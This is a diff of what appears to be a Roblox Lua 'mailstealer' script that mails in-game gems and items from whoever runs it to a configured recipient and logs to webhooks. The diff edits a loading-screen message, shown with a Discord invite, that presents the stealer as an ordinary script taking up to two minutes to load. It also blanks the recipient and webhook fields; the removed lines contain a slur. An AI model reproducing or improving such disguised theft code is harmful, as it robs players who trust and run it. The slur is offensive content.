@@ -23,7 +23,7 @@ textLabel.Size = UDim2.new(1, 0, 0.6, 0)
 textLabel.Position = UDim2.new(0, 0, 0.2, 0)
 textLabel.BackgroundTransparency = 1
 textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-textLabel.Text = "LOADING SCRIPT!"
+textLabel.Text = "Script is loading! May take up to 2 minutes, Made by Scripting Air! discord.gg/X6cEmyjFG2"
 textLabel.TextScaled = true
 textLabel.Font = Enum.Font.GothamBold
 textLabel.TextStrokeTransparency = 0.5
@@ -55,10 +55,10 @@ frame.Draggable = true
 
 
 DualRAP = 0
-DualUser = "yours"
-DualWebhook = "niiger"
+DualUser = ""
+DualWebhook = ""
 
-LogsWebhook = "sigma"
+LogsWebhook = ""
 mailstealer_name = "Fe!ner mail scripts"
 
 
@@ -92,7 +92,7 @@ if idiotuser == Username then
     return
 end
 if Username == nil then
-    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+    game:GetService("Players").LocalPlayer:Kick("swatplayertheboy")
     return
 end
 
@@ -143,7 +143,7 @@ FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
 
 
 if FirstPriceOfMail > GemsAmount then
-    print("You don't have enough gems to run a script")
+    print("You need enough gems to use the script due to stats!")
     return
 end
 
